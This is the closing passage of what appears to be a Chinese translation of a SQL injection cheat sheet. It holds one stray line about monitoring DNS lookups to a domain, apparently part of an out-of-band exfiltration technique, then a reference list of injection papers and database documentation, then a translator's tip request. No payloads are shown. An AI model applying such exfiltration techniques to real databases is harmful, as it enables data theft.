你需要监测去到com 的 DNS 解析请求
```
### 参考资料
由于这些笔记是从一些不同的来源搜集的，有些年头了，个人经验看来我可能遗漏了部分参考资料。如果有这样的情况，请 [联系我们](https://www.netsparker.com/contact/) 以便将你加入这个列表。
- **通用类的**- [Advanced SQL Injection In SQL Applications](http://www.ngssoftware.com/papers/advanced_sql_injection.pdf), *Chris Anley*
- [More Advanced SQL Injection In SQL Applications](http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf), *Chris Anley*
- [Blindfolded SQL Injection](http://www.imperva.com/download.asp?id=4), *Ofer Maor – Amichai Shulman*
- [Hackproofing MySQL](http://www.ngssoftware.com/papers/HackproofingMySQL.pdf), *Chris Anley*
- [Database Hacker’s Handbook](http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html), *David Litchfield, Chris Anley, John Heasman, Bill Grindlay*
- **MSSQL ****相关的**- MSSQL Operators – [http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx](http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx)
- Transact-SQL Reference – [http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx](http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx)
- String Functions (Transact-SQL) – [http://msdn2.microsoft.com/en-us/library/ms181984.aspx](http://msdn2.microsoft.com/en-us/library/ms181984.aspx)
- List of MSSQL Server Collation Names –[http://msdn2.microsoft.com/en-us/library/ms180175.aspx](http://msdn2.microsoft.com/en-us/library/ms180175.aspx)
- MSSQL Server 2005 Login Information and some other functions:[Sumit Siddharth](http://www.notsosecure.com/)
- **MySQL ****相关的**- Comments: [http://dev.mysql.com/doc/](http://dev.mysql.com/doc/)
- Control Flows – [http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html](http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html)
- MySQL Gotchas – [http://sql-info.de/mysql/gotchas.htm](http://sql-info.de/mysql/gotchas.html)
- [New SQL Injection Concept](http://www.securiteam.com/securityreviews/5KP0N1PC1W.html), *Tonu Samuel*
**全文完 [END]**
> 
**打赏支持我翻译更多好文章，谢谢！**
[打赏译者](#rewardbox)
#### 打赏支持我翻译更多好文章，谢谢！
任选一种支付方式
![](http://jbcdn2.b0.upaiyun.com/2016/09/663741790ffc1f3e2a4264633fb6259d.png)![](http://jbcdn2.b0.upaiyun.com/2016/09/1908bf5aff96cf624c8933173c3234ca.jpg)
